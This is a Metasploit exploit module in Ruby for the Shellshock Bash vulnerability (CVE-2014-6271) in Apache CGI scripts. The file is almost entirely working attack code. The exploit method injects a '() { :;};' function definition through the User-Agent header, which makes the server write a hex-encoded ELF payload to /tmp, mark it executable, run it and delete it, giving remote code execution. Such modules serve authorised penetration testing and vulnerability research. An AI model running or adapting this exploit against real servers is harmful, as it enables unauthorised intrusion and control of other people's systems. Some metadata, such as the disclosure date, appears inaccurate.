##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Shellshock Bashed CGI RCE',
      'Description'    => %q{
          This module exploits the shellshock vulnerability in apache cgi. It allows you to
        excute any metasploit payload you want.
      },
      'Author'         =>
        [
            'Stephane Chazelas',    # vuln discovery
            'Fady Mohamed Osman'    # Metasploit module f.othman at zinad.net
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2014-6271' ]
        ],
      'Payload'      =>
        {
          'BadChars' => "",
        },
        'Platform' => 'linux',
        'Arch'           => ARCH_X86,
        'Targets'        =>
        [
          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ]
        ],
        'DefaultTarget'  => 0,
        'DisclosureDate' => 'Aug 13 2014'))
 
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The CGI url', '/cgi-bin/test.sh']) ,
        OptString.new('FILEPATH', [true, 'The url ', '/tmp'])
      ], self.class)
  end
 
  def exploit
    @payload_name = "#{rand_text_alpha(5)}"
    full_path = datastore['FILEPATH'] + '/' + @payload_name
    payload_exe = generate_payload_exe
    if payload_exe.blank?
      fail_with(Failure::BadConfig, "#{peer} - Failed to generate the ELF, select a native payload")
    end
    peer = "#{rhost}:#{rport}"
    print_status("#{peer} - Creating payload #{full_path}")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => datastore['TARGETURI'],
      'agent'    => "() { :;}; /bin/bash -c \"" + "printf " + "\'" + Rex::Text.hexify(payload_exe).gsub("\n",'') + "\'" +  "> #{full_path}; chmod +x #{full_path};#{full_path};rm #{full_path};\""
    })
  end
end
